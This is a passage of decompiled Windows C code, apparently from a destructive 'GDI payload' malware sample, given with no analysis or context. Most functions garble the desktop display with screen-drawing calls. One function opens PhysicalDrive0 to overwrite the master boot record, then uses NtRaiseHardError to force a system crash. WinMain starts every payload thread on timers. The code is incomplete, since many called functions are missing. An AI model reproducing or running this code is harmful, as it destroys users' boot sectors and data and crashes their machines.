}void __fastcall  sub_140002EA0(PVOID Parameter)
{
	int v1; // er14
	int v2; // esi
	HWND v3; // rax
	HDC hdcSrc; // rbp
	int v5; // eax
	HBRUSH v6; // rax
	int v7; // ebx
	int y1; // edi
	int cy; // ebx
	int v10; // eax

	Sleep(0x186A0u);
	v1 = GetSystemMetrics(0);
	v2 = GetSystemMetrics(1);
	v3 = GetDesktopWindow();
	for (hdcSrc = GetDC(v3); ; BitBlt(hdcSrc, 0, v10 % v2, v1, cy, hdcSrc, 0, y1, 0xAA0068u))
	{
		v5 = rand();
		v6 = CreateSolidBrush(v5 % 0xFFFFFF);
		SelectObject(hdcSrc, v6);
		v7 = rand() % v2;
		y1 = rand() % 61 - 20;
		cy = v2 / -2 - rand() % v2 + 144 + v7;
		v10 = rand();
	}
}void __fastcall  sub_140002FB0(PVOID Parameter)
{
	HWND v1; // rax
	HDC hdcSrc; // r14
	__int64 v3; // r15
	int v4; // esi
	int cy; // ebp
	int i; // edi
	double v7; // xmm6_8
	int v8; // ebx
	double v9; // xmm0_8

	Sleep(0x18E70u);
	v1 = GetDesktopWindow();
	hdcSrc = GetDC(v1);
	GetSystemMetrics(0);
	GetSystemMetrics(1);
	v3 = 25i64;
	do
	{
		v4 = GetSystemMetrics(0);
		cy = GetSystemMetrics(1);
		for (i = 0; i < 361; i += 17)
		{
			v7 = (double)i * 3.141592653589793;
			v8 = (int)(sin(v7 / 90.0) * 10.0);
			v9 = cos(v7 / 80.0);
			BitBlt(hdcSrc, (int)(v9 * 10.0), v8, v4, cy, hdcSrc, 0, 0, 0xCC0020u);
		}
		--v3;
	} while (v3);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}void __fastcall  sub_140003410(PVOID Parameter)
{
	int v1; // er13
	HWND v2; // rax
	HDC v3; // r12
	unsigned int v4; // edx
	unsigned int v5; // edx
	int v6; // er15
	unsigned int v7; // er8
	unsigned int v8; // er8
	int h; // er14
	unsigned int v10; // er10
	unsigned int v11; // er10
	unsigned int v12; // er9
	unsigned int v13; // er9
	unsigned int v14; // ecx
	int v15; // edi
	HBRUSH v16; // rbx
	HBRUSH v17; // rsi
	HBRUSH v18; // rbp
	unsigned int w; // [rsp+78h] [rbp+10h]
	__int64 v20; // [rsp+80h] [rbp+18h]

	Sleep(0x19E10u);
	int dword_140018648 = GetTickCount();
	v20 = 16i64;
	do
	{
		w = GetSystemMetrics(0);
		v1 = GetSystemMetrics(1);
		v2 = GetDesktopWindow();
		GetWindowDC(v2);
		v3 = GetDC(0i64);
		v4 = ((dword_140018648 + 1831565813) | 1)
			* ((dword_140018648 + 1831565813) ^ ((unsigned int)(dword_140018648 + 1831565813) >> 15));
		v5 = (v4 + (v4 | 0x3D) * (v4 ^ (v4 >> 7))) ^ v4;
		v6 = (v5 ^ (v5 >> 14)) % w;
		v7 = ((dword_140018648 - 631835670) | 1)
			* ((dword_140018648 - 631835670) ^ ((unsigned int)(dword_140018648 - 631835670) >> 15));
		v8 = (v7 + (v7 | 0x3D) * (v7 ^ (v7 >> 7))) ^ v7;
		h = v1 + (int)w / -2 - (v8 ^ (unsigned __int64)(v8 >> 14)) % w + 110;
		v10 = ((dword_140018648 - 631835670 + 1831565813) | 1)
			* ((dword_140018648 - 631835670 + 1831565813) ^ ((unsigned int)(dword_140018648 - 631835670 + 1831565813) >> 15));
		v11 = (v10 + (v10 | 0x3D) * (v10 ^ (v10 >> 7))) ^ v10;
		v12 = ((dword_140018648 - 1263671340) | 1)
			* ((dword_140018648 - 1263671340) ^ ((unsigned int)(dword_140018648 - 1263671340) >> 15));
		dword_140018648 = dword_140018648 - 1263671340 + 1831565813;
		v13 = (v12 + (v12 | 0x3D) * (v12 ^ (v12 >> 7))) ^ v12;
		v14 = ((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))
			+ (((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) | 0x3D)
			* (((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) ^ (((dword_140018648 | 1)
				* (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) >> 7))) ^ ((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) ^ ((((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15)) + (((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) | 0x3D) * (((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) ^ (((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) >> 7))) ^ ((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15)))) >> 14);
		v15 = (unsigned __int8)((v11 ^ (v11 >> 14)) + (v11 ^ (v11 >> 14)) / 0xFF) | ((unsigned __int8)(v14 + v14 / 0xFF) << 16) | ((unsigned __int8)((v13 ^ (v13 >> 14)) + (v13 ^ (v13 >> 14)) / 0xFF) << 8);
		v16 = CreateHatchBrush(3, v15);
		v17 = CreateHatchBrush(4, v15);
		CreateHatchBrush(5, v15);
		v18 = CreateHatchBrush(2, v15);
		CreateHatchBrush(0, v15);
		CreateHatchBrush(1, v15);
		SelectObject(v3, v16);
		PatBlt(v3, v6, v1, v6, h, 0x5A0049u);
		PatBlt(v3, 0, 0, w, v1, 0x5A0049u);
		DeleteObject(v16);
		Sleep(0x64u);
		SelectObject(v3, v17);
		PatBlt(v3, v6, v1, v6, h, 0x5A0049u);
		PatBlt(v3, 0, 0, w, v1, 0x5A0049u);
		DeleteObject(v17);
		Sleep(0x64u);
		SelectObject(v3, v18);
		PatBlt(v3, v6, v1, v6, h, 0x5A0049u);
		PatBlt(v3, 0, 0, w, v1, 0x5A0049u);
		DeleteObject(v18);
		Sleep(0x64u);
		--v20;
	} while (v20);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}void __fastcall  sub_1400037B0(PVOID Parameter)
{
	HWND v1; // rbx
	HDC v2; // r14
	LONG v3; // er11
	int v4; // edi
	LONG v5; // er15
	int v6; // esi
	unsigned int v7; // er10
	unsigned int v8; // er9
	unsigned int v9; // er10
	int v10; // ecx
	unsigned int v11; // er9
	unsigned int v12; // ecx
	unsigned int i; // ebp
	int v14; // ebx
	struct tagRECT Rect; // [rsp+20h] [rbp-38h]

	Sleep(0x1ADB0u);
	v1 = GetDesktopWindow();
	GetWindowDC(v1);
	v2 = GetDC(0i64);
	GetWindowRect(v1, &Rect);
	v3 = Rect.bottom;
	v4 = 0;
	v5 = Rect.right;
	while (1)
	{
		INT dword_140018648 = 5;
		v6 = 0;
		v7 = ((dword_140018648 + 1831565813) | 1)
			* ((dword_140018648 + 1831565813) ^ ((unsigned int)(dword_140018648 + 1831565813) >> 15));
		v8 = ((dword_140018648 - 631835670) | 1)
			* ((dword_140018648 - 631835670) ^ ((unsigned int)(dword_140018648 - 631835670) >> 15));
		v9 = (v7 + (v7 | 0x3D) * (v7 ^ (v7 >> 7))) ^ v7;
		v10 = (v8 | 0x3D) * (v8 ^ (v8 >> 7));
		dword_140018648 = dword_140018648 - 631835670 + 1831565813;
		v11 = (v8 + v10) ^ v8;
		v12 = ((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))
			+ (((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) | 0x3D)
			* (((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) ^ (((dword_140018648 | 1)
				* (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) >> 7))) ^ ((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) ^ ((((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15)) + (((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) | 0x3D) * (((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) ^ (((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15))) >> 7))) ^ ((dword_140018648 | 1) * (dword_140018648 ^ ((unsigned int)dword_140018648 >> 15)))) >> 14);
		for (i = ((v9 ^ (v9 >> 14)) % 0xFF) | ((unsigned __int8)(v12 + v12 / 0xFF) << 16) | ((unsigned __int8)((v11 ^ (v11 >> 14)) + (v11 ^ (v11 >> 14)) / 0xFF) << 8);
			v6 < v5;
			++v6)
		{
			v14 = 0;
			if (v3 > 0)
			{
				do
				{
					SetPixel(v2, v6, v14, i);
					v3 = Rect.bottom;
					++v4;
					v14 += 7;
				} while (v14 < Rect.bottom);
				v5 = Rect.right;
			}
		}
		if (v4 > 20)
		{
			RedrawWindow(0i64, 0i64, 0i64, 0x85u);
			ExitThread(1u);
		}
	}
}void __fastcall  sub_140003990(PVOID Parameter)
{
	HDC hdcSrc; // r14
	int v2; // er12
	__int64 v3; // r15
	int v4; // er13
	int v5; // esi
	int v6; // ebp
	DWORD rop; // edi
	int y1; // ebx
	int v9; // eax

	Sleep(0x1E460u);
	hdcSrc = GetDC(0i64);
	v2 = GetSystemMetrics(0);
	v3 = 501i64;
	v4 = GetSystemMetrics(1);
	while (1)
	{
		v5 = rand() % v2;
		v6 = rand() % v4;
		rop = 13369376;
		if (!(rand() & 5))
			rop = 15597702;
		y1 = rand() % 2 + v6 - 1;
		v9 = rand();
		BitBlt(hdcSrc, v5, v6, 200, 200, hdcSrc, v5 + v9 % 21 - 10, y1, rop);
		if (!--v3)
		{
			RedrawWindow(0i64, 0i64, 0i64, 0x85u);
			ExitThread(1u);
		}
	}
}void __fastcall  sub_140003C90(PVOID Parameter)
{
	__int64 v1; // r13
	HDC v2; // r12
	HDC v3; // r15
	int v4; // er14
	int v5; // esi
	HBITMAP v6; // rbp
	HWND v7; // rax
	int v8; // edi
	int v9; // ebx
	int v10; // eax
	HBRUSH v11; // rax
	struct tagRECT Rect; // [rsp+50h] [rbp-68h]
	POINT Point; // [rsp+60h] [rbp-58h]
	int v14; // [rsp+68h] [rbp-50h]
	int v15; // [rsp+6Ch] [rbp-4Ch]
	int v16; // [rsp+70h] [rbp-48h]
	int v17; // [rsp+74h] [rbp-44h]

	Sleep(0x23668u);
	v1 = 101i64;
	do
	{
		v2 = GetDC(0i64);
		v3 = CreateCompatibleDC(v2);
		v4 = GetSystemMetrics(0);
		v5 = GetSystemMetrics(1);
		v6 = CreateCompatibleBitmap(v2, v4, v5);
		SelectObject(v3, v6);
		v7 = GetDesktopWindow();
		GetWindowRect(v7, &Rect);
		Point.x = Rect.left + 2;
		v14 = Rect.right + 2;
		Point.y = Rect.top - 2;
		v15 = Rect.top + 2;
		v16 = Rect.left - 2;
		v17 = Rect.bottom - 2;
		PlgBlt(v3, &Point, v2, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
		v8 = (unsigned __int8)(rand() % 388) << 8;
		v9 = v8 | ((unsigned __int8)(rand() % 39) << 16);
		v10 = rand();
		v11 = CreateSolidBrush(v9 | (unsigned int)(unsigned __int8)(v10 % 309));
		SelectObject(v2, v11);
		BitBlt(v2, 0, 0, v4, v5, v3, 0, 0, 0xCC0020u);
		DeleteDC(v2);
		DeleteObject(v6);
		--v1;
	} while (v1);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}void __fastcall  sub_140003EA0(PVOID Parameter)
{
	__int64 v1; // r13
	HDC v2; // r12
	HDC v3; // r15
	int v4; // er14
	int v5; // esi
	HBITMAP v6; // rbp
	HWND v7; // rax
	int v8; // edi
	int v9; // ebx
	int v10; // eax
	HBRUSH v11; // rax
	struct tagRECT Rect; // [rsp+50h] [rbp-68h]
	POINT Point; // [rsp+60h] [rbp-58h]
	int v14; // [rsp+68h] [rbp-50h]
	int v15; // [rsp+6Ch] [rbp-4Ch]
	int v16; // [rsp+70h] [rbp-48h]
	int v17; // [rsp+74h] [rbp-44h]

	Sleep(0x26930u);
	v1 = 101i64;
	do
	{
		v2 = GetDC(0i64);
		v3 = CreateCompatibleDC(v2);
		v4 = GetSystemMetrics(0);
		v5 = GetSystemMetrics(1);
		v6 = CreateCompatibleBitmap(v2, v4, v5);
		SelectObject(v3, v6);
		v7 = GetDesktopWindow();
		GetWindowRect(v7, &Rect);
		Point.x = Rect.left - 2;
		v14 = Rect.right - 2;
		Point.y = Rect.top + 2;
		v15 = Rect.top - 2;
		v16 = Rect.left + 2;
		v17 = Rect.bottom + 2;
		PlgBlt(v3, &Point, v2, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
		v8 = (unsigned __int8)(rand() % 388) << 8;
		v9 = v8 | ((unsigned __int8)(rand() % 39) << 16);
		v10 = rand();
		v11 = CreateSolidBrush(v9 | (unsigned int)(unsigned __int8)(v10 % 309));
		SelectObject(v2, v11);
		BitBlt(v2, 0, 0, v4, v5, v3, 0, 0, 0xCC0020u);
		DeleteDC(v2);
		DeleteObject(v6);
		--v1;
	} while (v1);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}void __fastcall  sub_1400040B0(PVOID Parameter)
{
	__int64 v1; // r13
	HDC v2; // r12
	HDC v3; // r15
	int v4; // er14
	int v5; // esi
	HBITMAP v6; // rbp
	HWND v7; // rax
	int v8; // ebx
	int v9; // edi
	int v10; // eax
	HBRUSH v11; // rax
	struct tagRECT Rect; // [rsp+50h] [rbp-78h]
	POINT Point; // [rsp+60h] [rbp-68h]
	int v14; // [rsp+68h] [rbp-60h]
	int v15; // [rsp+6Ch] [rbp-5Ch]
	int v16; // [rsp+70h] [rbp-58h]
	int v17; // [rsp+74h] [rbp-54h]

	Sleep(0x2AB98u);
	v1 = 131i64;
	do
	{
		v2 = GetDC(0i64);
		v3 = CreateCompatibleDC(v2);
		v4 = GetSystemMetrics(0);
		v5 = GetSystemMetrics(1);
		v6 = CreateCompatibleBitmap(v2, v4, v5);
		SelectObject(v3, v6);
		v7 = GetDesktopWindow();
		GetWindowRect(v7, &Rect);
		Point.x = Rect.left + 7;
		v14 = Rect.right + 7;
		Point.y = Rect.top - 7;
		v15 = Rect.top + 7;
		v16 = Rect.left - 7;
		v17 = Rect.bottom - 7;
		PlgBlt(v3, &Point, v2, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
		v8 = (unsigned __int8)(rand() % 399) << 8;
		v9 = v8 | ((unsigned __int8)(rand() % 399) << 16);
		v10 = rand();
		v11 = CreateSolidBrush(v9 | (unsigned int)(unsigned __int8)(v10 % 399));
		SelectObject(v2, v11);
		BitBlt(v2, 0, 0, v4, v5, v3, 0, 0, 0x98123Cu);
		DeleteDC(v2);
		DeleteObject(v6);
		--v1;
	} while (v1);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}void __fastcall  sub_1400042D0(PVOID Parameter)
{
	HWND v1; // rax
	HWND v2; // rax
	__int64 v3; // rbp
	int v4; // esi
	int cy; // edi
	HWND v6; // rax
	HWND v7; // rax
	HWND v8; // rax
	HDC v9; // rbx
	HDC hdcSrc; // rax
	HDC v11; // rax
	HWND v12; // rax

	Sleep(0x2C308u);
	v1 = GetForegroundWindow();
	GetDC(v1);
	GetDC(0i64);
	GetSystemMetrics(0);
	GetSystemMetrics(1);
	GetSystemMetrics(16);
	GetDC(0i64);
	v2 = GetForegroundWindow();
	GetDC(v2);
	GetDC(0i64);
	v3 = 31i64;
	do
	{
		rand();
		rand();
		rand();
		GetForegroundWindow();
		rand();
		rand();
		rand();
		v4 = GetSystemMetrics(0);
		cy = GetSystemMetrics(1);
		v6 = GetForegroundWindow();
		GetDC(v6);
		GetDC(0i64);
		v7 = GetForegroundWindow();
		GetDC(v7);
		GetDC(0i64);
		v8 = GetForegroundWindow();
		GetDC(v8);
		v9 = GetDC(0i64);
		hdcSrc = GetDC(0i64);
		BitBlt(v9, 100, 100, v4, cy, hdcSrc, 2, 2, 0x999999u);
		v11 = GetDC(0i64);
		BitBlt(v9, 0, 0, v4, cy, v11, 2, 2, 0x999999u);
		GetDC(0i64);
		v12 = GetForegroundWindow();
		GetDC(v12);
		GetDC(0i64);
		--v3;
	} while (v3);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}void __fastcall  sub_140004490(PVOID Parameter)
{
	int v1; // er14
	int v2; // er15
	__int64 v3; // r12
	HDC hdcSrc; // rdi
	HDC v5; // rsi
	HBITMAP v6; // rbp
	int xSrc; // ebx

	Sleep(0x2D690u);
	v1 = GetSystemMetrics(0);
	v2 = GetSystemMetrics(1);
	static unsigned long dword_140018644 = 123456789;
	dword_140018644 ^= (dword_140018644 << 13) ^ ((dword_140018644 ^ (unsigned int)(dword_140018644 << 13)) >> 17) ^ (32 * (dword_140018644 ^ (dword_140018644 << 13) ^ ((dword_140018644 ^ (unsigned int)(dword_140018644 << 13)) >> 17)));
	Sleep(dword_140018644 % 0x1F5u);
	v3 = 21i64;
	do
	{
		hdcSrc = GetDC(0i64);
		v5 = CreateCompatibleDC(hdcSrc);
		v6 = CreateCompatibleBitmap(hdcSrc, v1, v2);
		SelectObject(v5, v6);
		for (xSrc = -32; xSrc < 64; xSrc += 16)
		{
			dword_140018644 ^= (dword_140018644 << 13) ^ ((dword_140018644 ^ (unsigned int)(dword_140018644 << 13)) >> 17) ^ (32 * (dword_140018644 ^ (dword_140018644 << 13) ^ ((dword_140018644 ^ (unsigned int)(dword_140018644 << 13)) >> 17)));
			StretchBlt(
				v5,
				0,
				0,
				(int)((double)v1 / ((double)(int)(dword_140018644 % 0x3B7u + 500) / 600.0)),
				(int)((double)v2 / ((double)(int)(dword_140018644 % 0x3B7u + 500) / 600.0)),
				hdcSrc,
				xSrc,
				xSrc,
				(int)((double)v1 * ((double)(int)(dword_140018644 % 0x3B7u + 500) / 600.0)),
				(int)((double)v2 * ((double)(int)(dword_140018644 % 0x3B7u + 500) / 600.0)),
				0x440328u);
		}
		BitBlt(hdcSrc, 1, 1, v1, v2, v5, 0, 0, 0x440328u);
		DeleteObject(v6);
		DeleteDC(v5);
		dword_140018644 ^= (dword_140018644 << 13) ^ ((dword_140018644 ^ (unsigned int)(dword_140018644 << 13)) >> 17) ^ (32 * (dword_140018644 ^ (dword_140018644 << 13) ^ ((dword_140018644 ^ (unsigned int)(dword_140018644 << 13)) >> 17)));
		Sleep(dword_140018644 % 0x1F5u);
		--v3;
	} while (v3);
	RedrawWindow(0i64, 0i64, 0i64, 0x85u);
	ExitThread(1u);
}void __fastcall  sub_1400046E0(PVOID Parameter)
{
	HWND v1; // rax
	HDC v2; // r14
	int v3; // ebp
	int v4; // esi
	int v5; // eax
	int v6; // ebx
	int v7; // eax
	int v8; // edi
	int v9; // eax
	int v10; // eax
	int v11; // ebx
	int v12; // eax
	int v13; // edi
	int v14; // eax
	int v15; // ebx
	int v16; // eax

	Sleep(0x2E248u);
	while (1)
	{
		v1 = GetDesktopWindow();
		v2 = GetWindowDC(v1);
		v3 = GetSystemMetrics(0);
		v4 = GetSystemMetrics(1);
		v5 = rand();
		v6 = (unsigned __int8)(v5 + v5 / 255) << 8;
		v7 = rand();
		v8 = v6 | ((unsigned __int8)(v7 + v7 / 255) << 16);
		v9 = rand();
		SetTextColor(v2, v8 | (unsigned __int8)(v9 % 255));
		v10 = rand();
		v11 = (unsigned __int8)(v10 + v10 / 255) << 8;
		v12 = rand();
		v13 = v11 | ((unsigned __int8)(v12 + v12 / 255) << 16);
		v14 = rand();
		SetBkColor(v2, v13 | (unsigned __int8)(v14 % 255));
		v15 = rand() % v4;
		v16 = rand();
		TextOutW(v2, v16 % v3, v15, L"                 ", 17);
	}
}void __fastcall  sub_140004970(PVOID Parameter)
{
	HDC v1; // r12
	HDC hdcSrc; // r15
	int v3; // er14
	int cy; // esi
	HBITMAP v5; // rbp
	HWND v6; // rax
	int v7; // edi
	int v8; // ebx
	int v9; // eax
	HBRUSH v10; // rax
	struct tagRECT Rect; // [rsp+50h] [rbp-48h]

	Sleep(0x2E630u);
	while (1)
	{
		v1 = GetDC(0i64);
		hdcSrc = CreateCompatibleDC(v1);
		v3 = GetSystemMetrics(0);
		cy = GetSystemMetrics(1);
		v5 = CreateCompatibleBitmap(v1, v3, cy);
		SelectObject(hdcSrc, v5);
		v6 = GetDesktopWindow();
		GetWindowRect(v6, &Rect);
		v7 = (unsigned __int8)(rand() % 388) << 8;
		v8 = v7 | ((unsigned __int8)(rand() % 399) << 16);
		v9 = rand();
		v10 = CreateSolidBrush(v8 | (unsigned int)(unsigned __int8)(v9 % 309));
		SelectObject(v1, v10);
		BitBlt(v1, 0, 0, v3, cy, hdcSrc, 0, 0, 0x89345Cu);
		DeleteDC(v1);
		DeleteObject(v5);
	}
}__int64 __fastcall sub_140004890(PVOID Parameter)
{
	HANDLE v1; // rbx
	unsigned __int8 OldValue; // [rsp+40h] [rbp-28h]
	DWORD NumberOfBytesWritten; // [rsp+44h] [rbp-24h]
	ULONG Response; // [rsp+48h] [rbp-20h]

	Sleep(0x33450u);
	v1 = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0i64, 3u, 0, 0i64);
	WriteFile(v1, NULL/*mbr*/, 0x200u, &NumberOfBytesWritten, 0i64);
	CloseHandle(v1);
	Sleep(0x4B0u);
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
	BOOLEAN tmp1; DWORD tmp2;
	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	return 0i64;
}
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	int result = 0xdeafbeef; // eax

	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)StartAddress, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140003280, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001ED0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140003100, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001820, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001650, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001050, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_1400011B0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001310, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001490, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001580, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001AE0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001CB0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001DC0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140002060, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140002280, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_1400023D0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_1400024F0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140002800, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140002C40, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140002D80, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140002EA0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140002FB0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140003410, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_1400037B0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140003990, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140003C90, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140003EA0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_1400040B0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_1400042D0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140004490, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_1400046E0, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140004970, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140004890, 0i64, 0, 0i64);
	Sleep(0xFFFFFFFF);
	return result;
}